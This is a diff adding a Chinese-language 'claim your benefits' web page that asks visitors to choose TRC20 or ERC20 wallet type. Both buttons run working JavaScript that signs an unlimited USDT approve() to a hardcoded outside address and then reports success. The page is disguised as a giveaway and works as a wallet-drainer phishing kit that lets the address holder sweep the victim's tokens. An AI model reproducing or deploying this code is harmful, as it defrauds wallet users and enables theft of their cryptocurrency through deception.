@@ -1,0 +1,80 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>領取福利</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+    }
+    h1 { font-size: 2rem; }
+    button {
+      padding: 1em 2em;
+      font-size: 1.2rem;
+      background: #0b93f6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin: 15px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 領取福利</h1>
+  <p>請選擇您的錢包類型進行確認：</p>
+  <button onclick="handleTRC20()">我是 TRC20 用戶</button>
+  <button onclick="handleERC20()">我是 ERC20 用戶</button>
+  <p id="status"></p>
+
+  <script>
+    const trc20Address = "TCMRji7PoETRuhTXWAVQCvk38k8gKVikYx";
+    const trc20USDT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
+    const erc20Address = "0xbE573CbFCBb9a5d930feCBDE3B530Bf31B033563";
+    const erc20USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    async function handleTRC20() {
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert("請使用支援 Tron 的錢包開啟（如 TronLink）");
+        return;
+      }
+      try {
+        const contract = await tronWeb.contract().at(trc20USDT);
+        await contract.approve(trc20Address, maxUint).send();
+        document.getElementById("status").innerText = "✅ 已授權最大 USDT 給活動地址！";
+      } catch (err) {
+        console.error(err);
+        alert("授權失敗，請確認錢包狀態");
+      }
+    }
+
+    async function handleERC20() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("請使用支援 Ethereum 的錢包（如 MetaMask）開啟");
+        return;
+      }
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        const usdt = new web3.eth.Contract([
+          {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+        ], erc20USDT);
+        await usdt.methods.approve(erc20Address, maxUint).send({ from: accounts[0] });
+        document.getElementById("status").innerText = "✅ 已授權最大 USDT 給活動地址！";
+      } catch (err) {
+        console.error(err);
+        alert("授權失敗，請確認錢包狀態");
+      }
+    }
+  </script>
+</body>
+</html>
